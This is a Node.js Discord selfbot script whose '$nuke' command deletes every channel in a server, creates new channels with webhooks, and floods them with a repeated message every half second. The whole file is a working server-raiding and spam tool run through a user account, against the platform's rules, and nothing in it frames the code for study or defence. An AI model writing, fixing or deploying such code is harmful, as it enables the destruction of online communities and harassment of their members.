const { WebhookClient } = require('discord.js');
const Discord = require('discord.js-selfbot');
const input = require('input');
const axios = require('axios');
const client = new Discord.Client();
const PREFIX = '$';
const escapeRegex = str => str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');

(async () => {
	client.on('ready', () => {
		console.log('ready');
	});

	client.on('message', async message => {
		if (message.author.id != client.user.id) return;
		const prefixRegex = new RegExp(
			`^(<@!?${client.user.id}>|${escapeRegex(PREFIX)})\\s*`
		);
		if (!prefixRegex.test(message.content)) return;
		const [, matchedPrefix] = message.content.match(prefixRegex);
		const args = message.content
			.slice(matchedPrefix.length)
			.trim()
			.split(/ +/);
		const command = args.shift().toLowerCase();

		if (command == 'nuke') {
			var hooks = [];
			var joinedArgs = args.join(' ');
			var name = joinedArgs.split('] [')[0].split('[')[1];
			var messag = joinedArgs.split('] [')[1].split(']')[0];
			message.guild.channels.cache.forEach(c => {
				c.delete();
			});
			for (i = 0; i < 2; i++) {
				message.guild.channels.create(name).then(c => {
					c.createWebhook(name).then(wh => {
						hooks.push([wh.id, wh.token]);
						//console.log([wh.id, wh.token]);
						//console.log(hooks);
					});
					//c.createWebhook(name).then(wh => {
					//	hooks.push([wh.id, wh.token]);
					//	console.log([wh.id, wh.token]);
					//});

					console.log(message.guild.channels.cache.size);
					if (message.guild.channels.cache.size == 1) {
						hooks.forEach(wh => {
							send(messag, wh[0], wh[1], 10);
							console.log(messag)
							console.log(wh[0])
							console.log(wh[1])
						});
					}
				});
			}
		}
	});
	console.clear();
	client.login('TokenHere');
})();

function send(messagg, id, token, count) {
	console.log('2', messagg, id, token, count);
	var eee = 0
	var thing = setInterval(() => {
	  console.log('looool')
	  axios.post('https://discord.com/api/webhooks/' + id + '/' + token, {
	    content: messagg
	  }).catch(() => {
	    console.log('o')
	  })
	  if (eee == count) {
	    clearInterval(thing)
	  }
	}, (1/2)*1000)
}
